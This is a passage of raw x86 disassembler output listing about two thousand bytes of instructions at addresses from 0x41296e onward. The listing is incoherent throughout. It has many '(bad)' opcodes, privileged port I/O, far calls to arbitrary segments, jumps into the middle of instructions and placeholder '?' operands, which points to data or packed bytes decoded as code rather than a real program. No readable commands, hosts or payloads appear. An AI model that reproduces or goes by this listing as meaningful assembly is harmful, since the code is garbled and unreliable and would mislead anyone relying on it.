  41296e:	or     BYTE PTR [edi+0x544bc58a],dl
  412974:	popf   
  412975:	sbb    eax,DWORD PTR [ecx]
  412977:	adc    al,0xb4
  412979:	mov    ecx,0xde7eb450
  41297e:	out    0xe9,eax
  412980:	rcl    BYTE PTR [edi+0x250b5c98],0x55
  412987:	fidiv  DWORD PTR [eax+edx*4-0x6d]
  41298b:	loop   0x412994
  41298d:	mov    ds:0x264544df,eax
  412992:	inc    eax
  412993:	dec    ebx
  412994:	dec    esp
  412995:	or     DWORD PTR [esi+0x60],0x2b91788a
  41299c:	test   BYTE PTR [ecx+0x4d76e8a2],dh
  4129a2:	iret   
  4129a3:	cs out 0xa5,eax
  4129a6:	gs and dh,bh
  4129a9:	es sti 
  4129ab:	push   0xc35d1d7e
  4129b0:	pop    ss
  4129b1:	xor    DWORD PTR [ebp+0x3],ecx
  4129b4:	sub    edx,DWORD PTR [edx]
  4129b6:	mov    ah,0x4e
  4129b8:	fwait
  4129b9:	(bad)  
  4129ba:	fadd   st,st(6)
  4129bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129bd:	inc    ebx
  4129be:	ins    DWORD PTR es:[edi],dx
  4129bf:	pop    esi
  4129c0:	stos   BYTE PTR es:[edi],al
  4129c1:	(bad)  
  4129c3:	(bad)  
  4129c4:	or     bl,ch
  4129c6:	or     esp,DWORD PTR [edx+0x5a]
  4129c9:	cwde   
  4129ca:	mov    cl,0x89
  4129cc:	bound  ebp,QWORD PTR [ecx+0x1e6804bd]
  4129d2:	mov    ebx,0xc7cebe79
  4129d7:	push   eax
  4129d8:	je     0x4129c2
  4129da:	jno    0x41297d
  4129dc:	adc    eax,0x95ca68a7
  4129e1:	jbe    0x4129c1
  4129e3:	or     BYTE PTR [ebp+0x4d],0x10
  4129e7:	mov    DWORD PTR [ebx-0x4f373e3b],esi
  4129ed:	pop    eax
  4129ee:	mov    dl,0x9b
  4129f0:	fstp   DWORD PTR [eax-0x32313e39]
  4129f6:	and    al,0xde
  4129f8:	outs   dx,DWORD PTR ds:[esi]
  4129f9:	cld    
  4129fa:	mov    al,ds:0xf23780a4
  4129ff:	fs aad 0xdd
  412a02:	xchg   ecx,eax
  412a03:	stc    
  412a04:	retf   
  412a05:	nop
  412a06:	rol    edi,cl
  412a08:	push   eax
  412a09:	cmp    al,0x47
  412a0b:	and    al,0x68
  412a0d:	fucomi st,st(0)
  412a0f:	cli    
  412a10:	or     ebp,ecx
  412a12:	ds jge 0x4129eb
  412a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a16:	pop    edi
  412a17:	mov    WORD PTR [ebx+0x6ece5488],cs
  412a1d:	inc    ebx
  412a1e:	pop    ebp
  412a1f:	mov    esi,0xc38728d1
  412a24:	imul   DWORD PTR [ebx+eiz*8+0x3a9b7737]
  412a2b:	or     dh,BYTE PTR [edi-0x6d]
  412a2e:	xchg   esp,eax
  412a2f:	mov    bh,0xf7
  412a31:	popf   
  412a32:	xor    bl,ch
  412a34:	mov    bl,BYTE PTR [ebp-0x68fd1336]
  412a3a:	addr16 push esi
  412a3c:	(bad)  
  412a3d:	jge    0x412a21
  412a3f:	mov    esp,0x42580857
  412a44:	test   ebx,edi
  412a46:	jnp    0x412ab4
  412a48:	jp     0x412a39
  412a4a:	addr16 push ss
  412a4c:	add    eax,DWORD PTR [ebx+0xefef9c9]
  412a52:	mov    bh,0x91
  412a54:	dec    ecx
  412a55:	sbb    eax,0xc504f08b
  412a5a:	clc    
  412a5b:	in     eax,dx
  412a5c:	std    
  412a5d:	xchg   ebp,eax
  412a5e:	pop    edx
  412a5f:	dec    edi
  412a60:	fidiv  WORD PTR [ecx-0x10ed9881]
  412a66:	sbb    DWORD PTR [eax],ebp
  412a68:	pop    edx
  412a69:	inc    ebx
  412a6a:	ins    DWORD PTR es:[edi],dx
  412a6b:	xchg   edx,eax
  412a6c:	test   edx,0xdb9eb7
  412a72:	outs   dx,BYTE PTR ds:[esi]
  412a73:	pop    esi
  412a74:	shl    DWORD PTR [eax+0x28],0x12
  412a78:	fwait
  412a79:	pop    eax
  412a7a:	loop   0x412aae
  412a7c:	and    dh,ah
  412a7e:	clc    
  412a7f:	ins    BYTE PTR es:[edi],dx
  412a80:	mov    dh,0x5a
  412a82:	or     DWORD PTR ds:0xd3d82c88,esp
  412a88:	sar    DWORD PTR [edi],cl
  412a8a:	push   ebx
  412a8b:	sub    DWORD PTR [ebp+0x2956764e],ebx
  412a91:	adc    al,0x2f
  412a93:	mov    ds:0xbb9aa9a8,al
  412a98:	ror    DWORD PTR [esi-0x4115cdd7],1
  412a9e:	pop    ecx
  412a9f:	push   eax
  412aa0:	push   edi
  412aa1:	adc    BYTE PTR [edx-0x16a393cc],al
  412aa7:	and    al,dh
  412aa9:	scas   al,BYTE PTR es:[edi]
  412aaa:	gs ds popf 
  412aad:	loope  0x412a49
  412aaf:	pop    ds
  412ab0:	sub    eax,0x8d8d58a
  412ab5:	dec    esi
  412ab6:	rcr    BYTE PTR [ecx+0x28],0xa8
  412aba:	les    eax,FWORD PTR [edx-0x36]
  412abd:	push   esp
  412abe:	dec    ebx
  412abf:	sbb    BYTE PTR cs:[edx-0x10a21a6],0xe
  412ac7:	mov    ds:0x66035453,eax
  412acc:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  412ace:	ins    DWORD PTR es:[edi],dx
  412acf:	mov    BYTE PTR [esi*2-0x5dd7d691],0x60
  412ad7:	push   eax
  412ad8:	mov    bl,0x50
  412ada:	xor    al,0xd9
  412adc:	xchg   ecx,eax
  412add:	mov    ebx,0x590ce168
  412ae2:	ret    
  412ae3:	or     esp,DWORD PTR [ebx-0x133bcda1]
  412ae9:	mov    esp,0xa0f412b2
  412aee:	push   ebp
  412aef:	or     DWORD PTR [esp+eax*4-0x3e],ecx
  412af3:	lods   eax,DWORD PTR ds:[esi]
  412af4:	mov    edi,0xb19b178
  412af9:	pop    ebx
  412afa:	mov    WORD PTR [esi+0x377c9947],es
  412b00:	ins    BYTE PTR es:[edi],dx
  412b01:	jno    0x412b1b
  412b03:	adc    eax,0xaf9d85a4
  412b08:	inc    esp
  412b09:	or     ah,cl
  412b0b:	xchg   ebx,eax
  412b0c:	xchg   esi,eax
  412b0d:	int3   
  412b0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b0f:	call   0x671d:0x6b8c3b4e
  412b16:	ja     0x412b32
  412b18:	sti    
  412b19:	push   ebx
  412b1a:	loop   0x412b7c
  412b1c:	test   ch,ah
  412b1e:	stos   DWORD PTR es:[edi],eax
  412b1f:	retf   
  412b20:	loopne 0x412b06
  412b22:	mov    dl,0x27
  412b24:	loop   0x412b40
  412b26:	lea    esi,[ebp-0x14]
  412b29:	stos   DWORD PTR es:[edi],eax
  412b2a:	and    dh,0xea
  412b2d:	adc    BYTE PTR [eax-0x1c9b2338],bh
  412b33:	dec    edx
  412b34:	shl    DWORD PTR [ebx+ecx*1+0x5fcf8282],1
  412b3b:	inc    edi
  412b3c:	cli    
  412b3d:	jl     0x412bb7
  412b3f:	aas    
  412b40:	lods   al,BYTE PTR ds:[esi]
  412b41:	mov    edi,0xe2ba0c6b
  412b46:	cli    
  412b47:	add    al,BYTE PTR [edx+eax*1]
  412b4a:	push   ss
  412b4b:	aas    
  412b4c:	aas    
  412b4d:	dec    edi
  412b4e:	ss loop 0x412b41
  412b51:	lea    ebp,ds:0x6dfa2ef1
  412b57:	dec    ebx
  412b58:	aas    
  412b59:	cmp    edi,DWORD PTR [ebx-0x4e1f7473]
  412b5f:	icebp  
  412b60:	pop    edi
  412b61:	cmp    ebp,DWORD PTR [eax-0x7e6d6d9d]
  412b67:	pop    ds
  412b68:	cmp    eax,0x7d7662d5
  412b6d:	sbb    al,0xc5
  412b6f:	sub    al,0xe9
  412b71:	das    
  412b72:	fiadd  DWORD PTR [esi-0x7e211205]
  412b78:	cld    
  412b79:	jmp    0xf7b73d03
  412b7e:	das    
  412b7f:	cmp    BYTE PTR [esi-0x2aefdca3],al
  412b85:	aam    0xa7
  412b87:	sub    eax,0xeb7502ff
  412b8c:	xchg   ecx,eax
  412b8d:	rcl    BYTE PTR [esi-0x8],0xd1
  412b91:	cmp    al,0x59
  412b93:	pusha  
  412b94:	add    ch,BYTE PTR [edx-0x5d]
  412b97:	mov    al,ds:0x4a1af3f9
  412b9c:	mov    edx,0xe959cfa1
  412ba1:	fwait
  412ba2:	sbb    bh,BYTE PTR [edi+0x52]
  412ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ba6:	stc    
  412ba7:	cwde   
  412ba8:	fstp   DWORD PTR [edi-0x7ea44b14]
  412bae:	jl     0x412b6f
  412bb0:	mov    ch,0xc
  412bb2:	mov    eax,0xd7b246ef
  412bb7:	pop    ds
  412bb8:	inc    esp
  412bb9:	jmp    DWORD PTR [eax]
  412bbb:	push   esi
  412bbc:	mov    ds:0x5edaa0b6,al
  412bc1:	inc    esi
  412bc2:	lea    ecx,[ebx+0x16]
  412bc5:	cmp    BYTE PTR [edi+edx*2],bh
  412bc8:	imul   eax,DWORD PTR [ebx+0xb1b7af],0x900fee7b
  412bd2:	(bad)  
  412bd3:	mov    ds,WORD PTR [ecx]
  412bd5:	pop    ss
  412bd6:	lea    eax,[edx-0x75]
  412bd9:	stos   DWORD PTR es:[edi],eax
  412bda:	xchg   BYTE PTR [ebx+0x64],ah
  412bdd:	dec    esp
  412bde:	push   eax
  412bdf:	pusha  
  412be0:	inc    ebx
  412be1:	por    mm7,QWORD PTR [eax-0x2]
  412be5:	bound  eax,QWORD PTR [edi-0x1a83867f]
  412beb:	loop   0x412c33
  412bed:	enter  0x69b8,0xb5
  412bf1:	outs   dx,BYTE PTR ds:[esi]
  412bf2:	and    DWORD PTR [eax+0x3de5ade0],0x9b14d6cc
  412bfc:	sbb    bl,dl
  412bfe:	shl    BYTE PTR [edx-0x73],cl
  412c01:	loopne 0x412c1c
  412c03:	inc    eax
  412c04:	jle    0x412c67
  412c06:	ret    0xf6a1
  412c09:	jb     0x412b99
  412c0b:	aaa    
  412c0c:	lods   al,BYTE PTR ds:[esi]
  412c0d:	ffree  st(6)
  412c0f:	pop    edx
  412c10:	bound  ebx,QWORD PTR [ebx+0x61d8f26c]
  412c16:	test   DWORD PTR ss:[edi-0x7747d416],esi
  412c1d:	leave  
  412c1e:	mov    esi,0xac55366
  412c23:	dec    esi
  412c24:	(bad)
  412c28:	cmp    DWORD PTR [esi],0xd1c08b41
  412c2e:	push   ebp
  412c2f:	sub    DWORD PTR [ecx+0x4fbf9627],esi
  412c35:	not    BYTE PTR [edx-0x38]
  412c38:	jo     0x412bc5
  412c3a:	es push ebx
  412c3c:	sbb    edx,DWORD PTR [eax]
  412c3e:	(bad)  
  412c3f:	mov    dl,bh
  412c41:	nop
  412c42:	inc    esp
  412c43:	lock cmp bl,ch
  412c46:	and    DWORD PTR [ecx+0x54],0x49e54863
  412c4d:	inc    ecx
  412c4e:	jb     0x412c6b
  412c50:	inc    ebx
  412c51:	xchg   esp,eax
  412c52:	ss leave 
  412c54:	mov    dh,0xde
  412c56:	adc    ah,BYTE PTR [esi]
  412c58:	inc    ebp
  412c59:	dec    ebp
  412c5a:	xor    eax,0x782e92d4
  412c5f:	mov    esi,DWORD PTR [esi+eax*8+0x2e]
  412c63:	leave  
  412c64:	xchg   edx,eax
  412c65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c66:	jo     0x412c4b
  412c68:	xor    ebx,DWORD PTR [ebp+0x36]
  412c6b:	mov    dl,0x81
  412c6d:	loop   0x412c15
  412c6f:	mov    edx,0xd4a86c85
  412c74:	add    al,0x35
  412c76:	sbb    BYTE PTR [eax-0x68],bh
  412c79:	and    DWORD PTR [edx],0x1d48d3bd
  412c7f:	jo     0x412c4f
  412c81:	iret   
  412c82:	push   ss
  412c83:	fcmovne st,st(0)
  412c85:	mov    ah,al
  412c87:	xor    al,BYTE PTR [esi-0x59451d71]
  412c8d:	push   ebp
  412c8e:	push   edx
  412c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c90:	loope  0x412cb1
  412c92:	xchg   edi,eax
  412c93:	dec    edi
  412c94:	scas   eax,DWORD PTR es:[edi]
  412c95:	jo     0x412d00
  412c97:	dec    eax
  412c98:	shl    BYTE PTR [edx],cl
  412c9a:	pop    ebx
  412c9b:	stc    
  412c9c:	or     edi,ebx
  412c9e:	or     al,0xd4
  412ca0:	dec    edx
  412ca1:	xor    ecx,ebp
  412ca3:	adc    ch,BYTE PTR ds:0xfd728b34
  412ca9:	aad    0xd2
  412cab:	icebp  
  412cac:	loopne 0x412ca6
  412cae:	out    0x4e,al
  412cb0:	and    bh,0xf4
  412cb3:	xchg   edx,eax
  412cb4:	ret    
  412cb5:	mov    WORD PTR [esi],?
  412cb7:	xchg   DWORD PTR [ebx-0x42],eax
  412cba:	xor    eax,0xd48645a
  412cbf:	enter  0xdc2c,0x8
  412cc3:	add    eax,0xba23fed3
  412cc8:	jecxz  0x412cd3
  412cca:	mov    dl,0x1b
  412ccc:	idiv   BYTE PTR [ecx+0x7d]
  412ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cd0:	xchg   ebp,eax
  412cd1:	or     ah,BYTE PTR [edi]
  412cd3:	jl     0x412cd5
  412cd5:	pop    DWORD PTR [ebp-0x25]
  412cd8:	push   0xc44dc86d
  412cdd:	pop    es
  412cde:	mov    esp,0x8f819ab9
  412ce3:	mov    dh,0x22
  412ce5:	shr    BYTE PTR [edx],cl
  412ce7:	mov    esi,0x183c362
  412cec:	out    0x76,eax
  412cee:	push   es
  412cef:	leave  
  412cf0:	sub    al,0x78
  412cf2:	test   BYTE PTR [edx+0x19c364f4],bl
  412cf8:	mov    esp,0x3b5accdb
  412cfd:	xchg   edi,eax
  412cfe:	jl     0x412d12
  412d00:	mov    ebp,0xb69a5a1d
  412d05:	mov    cl,0x74
  412d07:	push   edx
  412d08:	dec    ebp
  412d09:	mov    esi,0x7d39e61b
  412d0e:	or     eax,0xf12fe4a7
  412d13:	inc    ebp
  412d14:	into   
  412d15:	cmp    DWORD PTR [edx-0x2d],ebx
  412d18:	in     eax,0x6a
  412d1a:	mov    al,0x90
  412d1c:	inc    edi
  412d1d:	je     0x412caf
  412d1f:	lahf   
  412d20:	inc    ch
  412d22:	cmp    DWORD PTR [ebx+0x270e48c5],edx
  412d28:	sub    eax,0xcfd03016
  412d2d:	and    bl,dh
  412d2f:	fidivr WORD PTR [ecx+0x5689b60a]
  412d35:	scas   al,BYTE PTR es:[edi]
  412d36:	pop    eax
  412d37:	je     0x412d09
  412d39:	push   ebp
  412d3a:	(bad)  
  412d3b:	xchg   esi,eax
  412d3c:	xchg   ecx,eax
  412d3d:	xor    DWORD PTR [edx],edi
  412d3f:	jnp    0x412d19
  412d41:	enter  0x5a9d,0x16
  412d45:	or     BYTE PTR gs:[ebx+0x2d],0xac
  412d4a:	loop   0x412d74
  412d4c:	push   esi
  412d4d:	xchg   ebp,eax
  412d4e:	or     DWORD PTR [edi],esp
  412d50:	pop    ebx
  412d51:	pop    ebx
  412d52:	xor    al,0x16
  412d54:	jge    0x412cf7
  412d56:	jl     0x412dc8
  412d58:	enter  0x8004,0xde
  412d5c:	imul   ecx,ecx,0xf3e5af6c
  412d62:	and    eax,0xc43dcda3
  412d67:	mov    ebp,0xec8f7f50
  412d6c:	and    BYTE PTR [edx],dh
  412d6e:	in     al,dx
  412d6f:	ror    BYTE PTR [ecx-0x55],1
  412d72:	sub    eax,0xe6fae943
  412d77:	repnz xor eax,0x7f50df08
  412d7d:	or     eax,0x760baf1e
  412d82:	in     eax,0x7f
  412d84:	jns    0x412d2a
  412d86:	lds    eax,FWORD PTR [eax-0x2a6ba11]
  412d8c:	jns    0x412d74
  412d8e:	fbld   TBYTE PTR [ecx+0x23]
  412d91:	adc    bl,cl
  412d93:	enter  0xdd7e,0xf
  412d97:	jp     0x412d21
  412d99:	jmp    0x71ac:0x4b3f90f2
  412da0:	in     eax,dx
  412da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412da2:	cmp    al,0xa3
  412da4:	out    dx,al
  412da5:	mov    ds:0x54a9816a,eax
  412daa:	dec    ebx
  412dab:	stos   DWORD PTR es:[edi],eax
  412dac:	ja     0x412dd0
  412dae:	or     DWORD PTR [eax],eax
  412db0:	mov    esi,0x22c15c91
  412db5:	shl    DWORD PTR [eax-0x10],0xc6
  412db9:	test   eax,0x8010d601
  412dbe:	in     al,0x67
  412dc0:	jmp    0x412d4a
  412dc2:	into   
  412dc3:	mov    dh,0xce
  412dc5:	int3   
  412dc6:	ins    DWORD PTR es:[edi],dx
  412dc7:	fsubrp st(1),st
  412dc9:	push   edi
  412dca:	pusha  
  412dcb:	mov    bh,0x5
  412dcd:	hlt    
  412dce:	inc    edx
  412dcf:	inc    esp
  412dd0:	mov    ebx,0x908cc437
  412dd5:	mov    BYTE PTR [ecx-0x163bfb70],al
  412ddb:	fstp   QWORD PTR [ebx-0x28]
  412dde:	mov    ds:0xb6047911,al
  412de3:	jge    0x412d91
  412de5:	xor    BYTE PTR [edx],0x85
  412de8:	(bad)  
  412de9:	mov    dl,0xca
  412deb:	call   0xad09b616
  412df0:	mov    cl,0x40
  412df2:	in     eax,0x32
  412df4:	mov    ebx,0x37a6ee3e
  412df9:	ins    DWORD PTR es:[di],dx
  412dfb:	out    dx,eax
  412dfc:	ret    0x5fa5
  412dff:	(bad)  
  412e02:	sbb    DWORD PTR [eax],0xb2aae057
  412e08:	ja     0x412df5
  412e0a:	test   eax,0x86164aaa
  412e0f:	clc    
  412e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e11:	xor    al,0xd9
  412e13:	fcom   QWORD PTR [esi+0x7c32cda7]
  412e19:	loopne 0x412e84
  412e1b:	dec    ecx
  412e1c:	cmc    
  412e1d:	fsubr  DWORD PTR [eax-0x3a561a5d]
  412e23:	inc    eax
  412e24:	pop    es
  412e25:	hlt    
  412e26:	jmp    0x80bc3dca
  412e2b:	(bad)  
  412e2d:	mov    esi,DWORD PTR [ecx-0x71]
  412e30:	or     cx,WORD PTR [ebp+0x4d]
  412e34:	arpl   WORD PTR [esi],si
  412e36:	jb     0x412e05
  412e38:	mov    DWORD PTR [eax+esi*8+0x10a2c03f],esi
  412e3f:	push   es
  412e40:	inc    esp
  412e41:	xchg   esp,eax
  412e42:	sub    eax,0xece3ddfe
  412e47:	add    bh,ch
  412e49:	jle    0x412e13
  412e4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e4c:	dec    edx
  412e4d:	mov    al,ds:0x7ad60230
  412e52:	pop    es
  412e53:	xor    al,BYTE PTR [edx+esi*1]
  412e56:	fwait
  412e57:	mov    edx,0xb523840d
  412e5c:	nop
  412e5d:	add    eax,0x8a7d9b1a
  412e62:	or     dh,bh
  412e64:	and    eax,0xdfbffd91
  412e69:	mov    dh,0x26
  412e6b:	sbb    al,0xd8
  412e6d:	xchg   esp,eax
  412e6e:	or     ch,BYTE PTR [ebx]
  412e70:	sbb    eax,0x85911910
  412e75:	loopne 0x412e3c
  412e77:	mov    bh,0xa6
  412e79:	nop
  412e7a:	cmp    al,0x6c
  412e7c:	bound  esi,QWORD PTR [esi-0x745c0ea4]
  412e82:	call   0xffb7:0xebe173ef
  412e89:	sbb    DWORD PTR [esi-0x7c],ecx
  412e8c:	cmp    al,bh
  412e8e:	inc    esp
  412e8f:	popf   
  412e90:	rcr    ecx,cl
  412e92:	adc    eax,0x25fd735c
  412e97:	sub    DWORD PTR [eax+0x34],ecx
  412e9a:	fimul  WORD PTR [edi+ecx*8+0x4776cdc3]
  412ea1:	mov    dh,0x32
  412ea3:	jecxz  0x412e8b
  412ea5:	leave  
  412ea6:	retf   
  412ea7:	sbb    eax,0x1b87777e
  412eac:	mov    eax,ds:0x17d31894
  412eb1:	push   ebp
  412eb2:	stc    
  412eb3:	sar    DWORD PTR [edi],cl
  412eb5:	jae    0x412ed7
  412eb7:	stos   DWORD PTR es:[edi],eax
  412eb8:	pop    ebp
  412eb9:	loop   0x412e3e
  412ebb:	aam    0xaf
  412ebd:	ds enter 0x9003,0xd8
  412ec2:	pushf  
  412ec3:	shr    BYTE PTR [ecx+0x7bdf9198],0x5d
  412eca:	in     eax,0x3a
  412ecc:	or     eax,0x3df84ea7
  412ed1:	imul   edi,DWORD PTR [esi],0xffffff85
  412ed4:	pop    esi
  412ed5:	sbb    al,0xf4
  412ed7:	clc    
  412ed8:	mov    esp,0x1789e47a
  412edd:	or     al,0x97
  412edf:	(bad)  
  412ee0:	loopne 0x412f25
  412ee2:	dec    ebp
  412ee3:	dec    esp
  412ee4:	or     BYTE PTR [eax-0x5ec6a337],bl
  412eea:	pop    ebp
  412eeb:	inc    ebx
  412eec:	fistp  QWORD PTR [eax+ebx*2-0x6c]
  412ef0:	aaa    
  412ef1:	fisttp QWORD PTR [edi]
  412ef3:	mov    ebp,0x4daae6c0
  412ef8:	mov    ah,0xbf
  412efa:	scas   al,BYTE PTR es:[edi]
  412efb:	sbb    bh,ah
  412efd:	cmp    eax,0xac03a949
  412f02:	sti    
  412f03:	or     BYTE PTR [esi],bh
  412f05:	stc    
  412f06:	sbb    BYTE PTR [eax+0x34],bh
  412f09:	inc    edi
  412f0a:	iret   
  412f0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f0c:	jb     0x412edf
  412f0e:	mov    al,ds:0x9bf1de97
  412f13:	cmp    bh,BYTE PTR [esi]
  412f15:	xchg   esp,eax
  412f16:	(bad)  
  412f17:	ds push 0x5b
  412f1a:	mov    edi,0x35a3251c
  412f1f:	add    al,0xf3
  412f21:	mov    esp,DWORD PTR [eax-0x4014d43a]
  412f27:	rcl    dl,1
  412f29:	inc    ecx
  412f2a:	ins    BYTE PTR es:[edi],dx
  412f2b:	mov    cl,0xda
  412f2d:	arpl   WORD PTR [ebx],si
  412f2f:	bt     DWORD PTR [ecx+ebp*8-0x46],ebx
  412f34:	push   ds
  412f35:	lods   al,BYTE PTR ds:[esi]
  412f36:	xchg   edx,eax
  412f37:	mov    ?,WORD PTR [edi+0x68742484]
  412f3d:	lods   eax,DWORD PTR ds:[esi]
  412f3e:	aam    0x62
  412f40:	call   0xd616:0x23f401d9
  412f47:	cwde   
  412f48:	cdq    
  412f49:	ffreep st(0)
  412f4b:	rol    BYTE PTR [edx-0x2570b9f],1
  412f51:	dec    eax
  412f52:	lods   al,BYTE PTR ds:[esi]
  412f53:	ret    
  412f54:	iret   
  412f55:	push   eax
  412f56:	jno    0x412f02
  412f58:	stc    
  412f59:	adc    ebp,DWORD PTR [esi-0x61d91964]
  412f5f:	in     eax,dx
  412f60:	or     bl,dl
  412f62:	in     eax,0x2f
  412f64:	lahf   
  412f65:	push   0x4a22ad6a
  412f6a:	dec    esp
  412f6b:	push   edi
  412f6c:	add    BYTE PTR [edx],cl
  412f6e:	mov    WORD PTR [esi+ebx*8],ss
  412f71:	aas    
  412f72:	xor    al,BYTE PTR [esi]
  412f74:	loope  0x412f49
  412f76:	shl    edi,cl
  412f78:	in     al,0x28
  412f7a:	(bad)  
  412f7b:	stos   DWORD PTR es:[edi],eax
  412f7c:	hlt    
  412f7d:	add    eax,0x684574b1
  412f82:	fmulp  st(5),st
  412f84:	push   ebp
  412f85:	mov    WORD PTR [ebx-0x4d1687bb],ss
  412f8b:	inc    eax
  412f8c:	test   al,0x25
  412f8e:	pop    bx
  412f90:	sub    edx,esi
  412f92:	enter  0x23f4,0xa8
  412f96:	jg     0x412f91
  412f98:	adc    DWORD PTR [edi+eax*1-0x19],esp
  412f9c:	mov    ecx,0x54402569
  412fa1:	dec    esp
  412fa2:	add    DWORD PTR [esi-0x54b67dce],0xc0958c42
  412fac:	jl     0x412fc1
  412fae:	mov    es,edx
  412fb0:	leave  
  412fb1:	pop    edi
  412fb2:	mov    bh,0x1f
  412fb4:	pop    ds
  412fb5:	shr    BYTE PTR [edi+eiz*1+0x62e3e5f7],1
  412fbc:	push   ebp
  412fbd:	stos   DWORD PTR es:[edi],eax
  412fbe:	mov    edi,?
  412fc0:	mov    edi,0x4f5970b2
  412fc5:	ret    
  412fc6:	into   
  412fc7:	lahf   
  412fc8:	or     eax,DWORD PTR [edi+ecx*1]
  412fcb:	push   edi
  412fcc:	stos   DWORD PTR es:[edi],eax
  412fcd:	mov    ds:0x40d3ae6b,eax
  412fd2:	push   cs
  412fd3:	into   
  412fd4:	add    cl,cl
  412fd6:	mov    BYTE PTR [ebp-0x20],ah
  412fd9:	loope  0x413021
  412fdb:	lods   eax,DWORD PTR ds:[esi]
  412fdc:	mov    ebp,0x1ceb099d
  412fe1:	mov    DWORD PTR ds:0x3c3a1a57,ecx
  412fe7:	je     0x412f95
  412fe9:	xchg   edx,eax
  412fea:	out    0x2a,al
  412fec:	push   ebx
  412fed:	loopne 0x413013
  412fef:	stos   DWORD PTR es:[edi],eax
  412ff0:	xor    eax,0xce4b70ee
  412ff5:	mov    al,0xb8
  412ff7:	push   ebp
  412ff8:	call   0xfdcd:0xf48085b6
  412fff:	push   edi
  413000:	inc    ebp
  413001:	shl    DWORD PTR [esi],0xc3
  413004:	je     0x41303d
  413006:	bound  ecx,QWORD PTR [ebx]
  413008:	imul   esp,DWORD PTR [ecx-0xf437e0c],0x1ea8a87a
  413012:	test   eax,0xa5666e67
  413017:	or     edx,DWORD PTR [ebp+0x65]
  41301a:	xchg   edx,eax
  41301b:	xchg   DWORD PTR [eax+0x61],esi
  41301e:	mov    bh,0x8e
  413020:	rol    BYTE PTR [ecx+0x5782ed6a],cl
  413026:	gs sbb eax,0x261b3999
  41302c:	push   ecx
  41302d:	out    0xff,al
  41302f:	jb     0x413004
  413031:	cmp    BYTE PTR [eax+ecx*1],0x22
  413035:	jne    0x413041
  413037:	or     dl,al
  413039:	xchg   esp,eax
  41303a:	(bad)  
  41303b:	xchg   esp,eax
  41303c:	addr16 gs xor al,0xc
  413040:	push   cs
  413041:	mov    edi,0x961f97a4
  413046:	xor    bh,al
  413048:	das    
  413049:	fldcw  WORD PTR [eax-0x5ead97e7]
  41304f:	scas   eax,DWORD PTR es:[edi]
  413050:	cmp    eax,DWORD PTR [ecx+0x7c]
  413053:	mov    esp,0x6a200c6b
  413058:	in     eax,0x92
  41305a:	push   0x6f6fa5ec
  41305f:	push   esp
  413060:	push   es
  413061:	enter  0x90b0,0xf3
  413065:	lock lods al,BYTE PTR ds:[esi]
  413067:	jno    0x4130b5
  413069:	mov    ss,WORD PTR [edi-0x7f469d6d]
  41306f:	(bad)  
  413070:	cli    
  413071:	dec    esp
  413072:	cmp    eax,0x9d0f5038
  413077:	dec    edx
  413078:	push   0xcadf79c2
  41307d:	aad    0x63
  41307f:	dec    edi
  413080:	and    DWORD PTR [esi+0x1438b62c],ebx
  413086:	pop    ds
  413087:	jge    0x413024
  413089:	jl     0x4130f4
  41308b:	and    ecx,DWORD PTR [ecx+0x5f]
  41308e:	mov    bh,0x27
  413090:	out    0xe7,al
  413092:	cmp    BYTE PTR [ecx-0x25242c30],cl
  413098:	clc    
  413099:	sbb    bl,al
  41309b:	addr16 je 0x41308b
  41309e:	or     BYTE PTR [edx+edx*2],bh
  4130a1:	inc    edx
  4130a2:	pop    ds
  4130a3:	mov    bl,BYTE PTR [esi-0x3]
  4130a6:	or     eax,0xe1255a9a
  4130ab:	scas   al,BYTE PTR es:[edi]
  4130ac:	cdq    
  4130ad:	sbb    BYTE PTR [esi],dh
  4130af:	loope  0x4130d3
  4130b1:	add    al,0x7e
  4130b3:	fst    QWORD PTR [esi+0x6a04fa99]
  4130b9:	sub    eax,0xc0674f4
  4130be:	std    
  4130bf:	pop    edx
  4130c0:	mov    WORD PTR [eax-0x46],ss
  4130c3:	or     esi,edx
  4130c5:	jmp    0x3d1c6a44
  4130ca:	fstp   TBYTE PTR [ecx]
  4130cc:	into   
  4130cd:	mov    gs,WORD PTR [edi+0x47c47a7e]
  4130d3:	(bad)  
  4130d4:	das    
  4130d5:	jmp    0x2a41c21f
  4130da:	mov    cl,0xe2
  4130dc:	out    dx,al
  4130dd:	jp     0x41315a
  4130df:	xor    BYTE PTR [ebx+esi*8-0x6e],dl
  4130e3:	mov    edx,0x3ee96f27
  4130e8:	jno    0x413149
  4130ea:	and    eax,0x77e0ef90
  4130ef:	popa   
  4130f0:	adc    esi,DWORD PTR [eax-0x121ce25c]
  4130f6:	push   ss
  4130f7:	loope  0x413084
  4130f9:	repnz addr16 adc eax,0x230e694c
  413100:	push   es
  413101:	call   0x860a:0x299b0fcc
  413108:	std    
  413109:	and    eax,0x8293402f
  41310e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41310f:	into   
  413110:	push   es
  413111:	fst    DWORD PTR [ecx-0x55a220d]
  413117:	push   esi
  413118:	sti    
  413119:	sub    eax,0x7652e634
  41311e:	and    ebp,DWORD PTR [ecx+0x5f82a71e]
  413124:	fisttp QWORD PTR [ecx+0x37]
  413127:	imul   ecx,DWORD PTR [esi+0xc972630],0xfffffff0
  41312e:	call   0xfffed75
  413133:	mov    dh,0x61
  413135:	push   ebp
  413136:	outs   dx,DWORD PTR cs:[esi]
  413138:	cwde   
  413139:	xchg   edx,eax
  41313a:	mov    cl,0xe
  41313c:	and    edx,DWORD PTR [ebx]
  41313e:	pusha  
  41313f:	das    
  413140:	dec    edi
  413141:	imul   ecx,DWORD PTR [ebp-0x734526a],0x5f2b66cd
  41314b:	les    edx,FWORD PTR [ecx-0x27]
  41314e:	imul   edx,DWORD PTR [esi+0x45],0x96b183f1
  413155:	pop    ecx
  413156:	jecxz  0x41319f
